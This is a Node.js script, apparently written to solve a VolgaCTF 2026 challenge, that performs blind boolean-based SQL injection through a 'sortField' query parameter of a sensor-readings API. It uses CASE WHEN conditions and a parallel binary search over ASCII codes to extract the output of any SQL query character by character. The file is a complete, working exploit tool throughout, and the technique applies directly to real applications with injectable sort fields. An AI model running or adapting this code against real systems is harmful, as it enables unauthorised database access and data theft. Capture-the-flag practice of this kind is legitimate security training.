const http = require('http');

const agent = new http.Agent({ keepAlive: true, maxSockets: 30 });

async function checkCondition(condition) {
    const sortField = `(CASE WHEN (${condition}) THEN value ELSE -value END)`;
    const url = `http://lucky-sensor-1.q.2026.volgactf.ru:8000/api/sensors/1/readings?sortField=${encodeURIComponent(sortField)}&sortDirection=ASC`;
    
    return new Promise((resolve) => {
        const req = http.get(url, { agent }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    if (res.statusCode !== 200) {
                        resolve(null);
                        return;
                    }
                    const json = JSON.parse(data);
                    if (!json || json.length === 0) {
                        resolve(null);
                        return;
                    }
                    const val = json[0].value;
                    if (val === 21.8) resolve(true);
                    else if (val === 23.1) resolve(false);
                    else resolve(null);
                } catch (e) {
                    resolve(null);
                }
            });
        });
        req.on('error', () => resolve(null));
        req.end();
    });
}

async function extractChar(query, index) {
    let low = 32;
    let high = 126;
    let foundChar = null;
    
    while (low <= high) {
        let mid = Math.floor((low + high) / 2);
        
        let conditionGt = `ascii(substr(CAST((${query}) AS String), ${index}, 1)) > ${mid}`;
        let isGt = await checkCondition(conditionGt);
        
        if (isGt) {
            low = mid + 1;
        } else {
            let conditionEq = `ascii(substr(CAST((${query}) AS String), ${index}, 1)) = ${mid}`;
            let isEq = await checkCondition(conditionEq);
            if (isEq) {
                return String.fromCharCode(mid);
            } else {
                high = mid - 1;
            }
        }
    }
    return ''; // empty string if not found
}

async function main() {
    let query = process.argv[2];
    let maxLength = parseInt(process.argv[3]) || 50;
    if (!query) {
        console.log("Usage: node super_sqli.js <query> [maxLength]");
        return;
    }
    
    console.log(`Extracting: ${query} (length: ${maxLength})`);
    
    let result = Array(maxLength).fill('?');
    let promises = [];
    
    for (let i = 1; i <= maxLength; i++) {
        promises.push(
            extractChar(query, i).then(c => {
                if (c) {
                    result[i - 1] = c;
                    process.stdout.write(`\r[+] Current: ${result.join('')}`);
                } else {
                    result[i - 1] = ''; // Terminate or ignore
                }
            })
        );
    }
    
    await Promise.all(promises);
    console.log("\n\nFINAL EXTRACTED: " + result.join(''));
}

main();
